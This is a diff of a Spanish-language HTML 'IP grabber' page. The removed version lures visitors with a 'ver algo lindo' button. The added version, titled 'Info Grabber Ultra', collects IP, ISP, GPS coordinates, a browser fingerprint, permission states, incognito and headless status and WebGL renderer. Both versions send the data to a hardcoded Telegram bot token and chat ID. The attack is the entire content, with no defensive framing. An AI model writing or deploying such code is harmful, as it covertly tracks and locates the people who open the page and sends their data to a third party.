@@ -2,108 +2,209 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Info Rápida</title>
-  <link
-    rel="stylesheet"
-    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-    crossorigin=""
-  />
+  <title>Info Grabber Ultra</title>
   <style>
-    body {
-      font-family: Arial;
-      padding: 20px;
-      background: #f0f0f0;
-      margin: 0;
-    }
-    .box {
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 100%;
-      box-sizing: border-box;
-    }
-    #map {
-      height: 300px;
-      margin-top: 15px;
-      border-radius: 10px;
-      display: none;
-    }
+    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    pre { white-space: pre-wrap; word-wrap: break-word; }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Haz click en el botón y rechaza la ubicación</h2>
-    <button onclick="collectAndSend()">ver algo lindo</button>
-    <pre id="result">...</pre>
-    <div id="map"></div>
+    <h2>Recolectar información avanzada</h2>
+    <button id="startBtn">Recolectar info con checks extras</button>
+    <pre id="result">Esperando acción...</pre>
   </div>
 
-  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
-  <script>
-    const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
-    const CHAT_ID = "6065284869";
+<script>
+const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
+const CHAT_ID = "6065284869";
 
-    const resultEl = document.getElementById("result");
-    const mapEl = document.getElementById("map");
+const resultEl = document.getElementById("result");
+const startBtn = document.getElementById("startBtn");
 
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
-      }).catch(() => {});
+let humanInteraction = false;
+["click", "mousemove", "keydown", "touchstart"].forEach(event => {
+  window.addEventListener(event, () => { humanInteraction = true; }, { once: true });
+});
+
+// Detectar navegador headless básico
+function detectHeadless() {
+  const isHeadless = navigator.webdriver ||
+                     !navigator.plugins.length ||
+                     !navigator.languages ||
+                     /HeadlessChrome/.test(navigator.userAgent);
+  return isHeadless ? "Sí" : "No";
+}
+
+// Detectar modo incógnito (FileSystem API)
+async function detectIncognito() {
+  return new Promise((resolve) => {
+    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+    if (!fs) {
+      resolve("No detectable");
+    } else {
+      fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí"));
     }
+  });
+}
 
-    function getIPInfo() {
-      return fetch("https://ipapi.co/json/").then(res => res.json());
-    }
+// Fingerprint simple
+function getFingerprint() {
+  return btoa([
+    navigator.userAgent,
+    navigator.language,
+    screen.width + 'x' + screen.height,
+    navigator.hardwareConcurrency || "n/a",
+    Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
+  ].join('|'));
+}
 
-    function collectAndSend() {
-      resultEl.textContent = "📡 Recopilando información rápida...";
+// Comprobar permisos (cámara, micrófono, localización)
+async function checkPermissions() {
+  if (!navigator.permissions) return "No soportado";
+  try {
+    const cams = await navigator.permissions.query({name:"camera"});
+    const mics = await navigator.permissions.query({name:"microphone"});
+    const geo = await navigator.permissions.query({name:"geolocation"});
+    return `Cámara: ${cams.state}, Micrófono: ${mics.state}, Geoloc: ${geo.state}`;
+  } catch {
+    return "Error consulta permisos";
+  }
+}
 
-      const geoPromise = new Promise((resolve, reject) => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
-        } else reject();
-      });
+// Comprobar si está aceleración hardware activada
+function checkHardwareAcceleration() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) return "No WebGL";
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (!debugInfo) return "No debug info";
+    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    return renderer || "No renderer";
+  } catch {
+    return "Error WebGL";
+  }
+}
 
-      Promise.allSettled([getIPInfo(), geoPromise]).then(([ipRes, geoRes]) => {
-        let message = "";
+// Detectar adblock (intentando fetch a dominio común bloqueado)
+async function detectAdblock() {
+  try {
+    const res = await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {method:"HEAD", mode:"no-cors"});
+    return "No detectado";
+  } catch {
+    return "Probable AdBlock";
+  }
+}
 
-        if (ipRes.status === "fulfilled") {
-          const ip = ipRes.value;
-          message += `IP: ${ip.ip}\nISP: ${ip.org}\nCiudad: ${ip.city}\nRegión: ${ip.region}\nPaís: ${ip.country_name}\n`;
-        } else {
-          message += "No se pudo obtener IP\n";
-        }
+// Detectar discrepancia entre timezone y locale
+function checkTimezoneLocale() {
+  try {
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const lang = navigator.language || navigator.userLanguage;
+    // Aquí un chequeo básico: si es idioma en español pero timezone está en UTC puede ser sospechoso
+    if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
+    return "OK";
+  } catch {
+    return "No disponible";
+  }
+}
 
-        message += `User-Agent: ${navigator.userAgent}\nHora: ${new Date().toLocaleString()}\n`;
+async function getIPInfo() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch {
+    return null;
+  }
+}
 
-        resultEl.textContent = message;
-        sendToTelegram(message);
+async function sendToTelegram(message) {
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+      }),
+    });
+  } catch(e) {
+    console.warn("Error enviando a Telegram:", e);
+  }
+}
 
-        if (geoRes.status === "fulfilled") {
-          const { latitude, longitude, accuracy } = geoRes.value.coords;
-          const locationInfo = `Lat: ${latitude}\nLon: ${longitude}\nPrecisión: ${accuracy}m`;
-          resultEl.textContent += "\n" + locationInfo;
-          sendToTelegram(locationInfo);
+async function collectAndSend() {
+  resultEl.textContent = "📡 Recopilando información avanzada...";
 
-          setTimeout(() => {
-            mapEl.style.display = "block";
-            const map = L.map("map").setView([latitude, longitude], 14);
-            L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
-              attribution: '&copy; OpenStreetMap contributors'
-            }).addTo(map);
-            L.marker([latitude, longitude]).addTo(map).bindPopup("Tu ubicación").openPopup();
-          }, 100);
-        } else {
-          console.log("Ubicación denegada o falló.");
-        }
-      });
-    }
-  </script>
+  const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
+    getIPInfo(),
+    new Promise((res, rej) => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
+      } else rej();
+    }),
+    detectIncognito(),
+    checkPermissions(),
+    detectAdblock()
+  ]);
+
+  let message = "";
+
+  if (ipRes.status === "fulfilled" && ipRes.value) {
+    const ip = ipRes.value;
+    message += `IP: ${ip.ip}
+ISP: ${ip.org}
+ASN: ${ip.asn}
+Proxy/VPN/Tor: ${ip.proxy ? "Sí" : "No"}
+Ciudad: ${ip.city}
+Región: ${ip.region}
+País: ${ip.country_name}
+Versión IP: ${ip.version}
+`;
+  } else {
+    message += "No se pudo obtener IP\n";
+  }
+
+  message += `User-Agent: ${navigator.userAgent}
+Navegador Headless: ${detectHeadless()}
+Modo Incógnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
+Interacción Humana: ${humanInteraction ? "Sí" : "No"}
+Pantalla: ${screen.width}x${screen.height}
+Resolución disponible: ${screen.availWidth}x${screen.availHeight}
+Touch Support: ${'ontouchstart' in window ? 'Sí' : 'No'}
+Plataforma: ${navigator.platform}
+Fingerprint: ${getFingerprint()}
+Permisos (cámara, micrófono, geoloc): ${permStatus.status === "fulfilled" ? permStatus.value : "No disponible"}
+Aceleración hardware (WebGL renderer): ${checkHardwareAcceleration()}
+Timezone vs Locale: ${checkTimezoneLocale()}
+AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
+Hora: ${new Date().toLocaleString()}
+`;
+
+  resultEl.textContent = message;
+  await sendToTelegram(message);
+
+  if (geoRes.status === "fulfilled") {
+    const { latitude, longitude, accuracy } = geoRes.value.coords;
+    const locationInfo = `\nUbicación Precisa:
+Latitud: ${latitude}
+Longitud: ${longitude}
+Precisión: ${accuracy} metros
+Hora: ${new Date().toLocaleString()}
+`;
+    resultEl.textContent += locationInfo;
+    await sendToTelegram(locationInfo);
+  } else {
+    resultEl.textContent += "\nUbicación precisa no disponible o rechazada.";
+  }
+}
+
+startBtn.onclick = collectAndSend;
+
+</script>
 </body>
 </html>
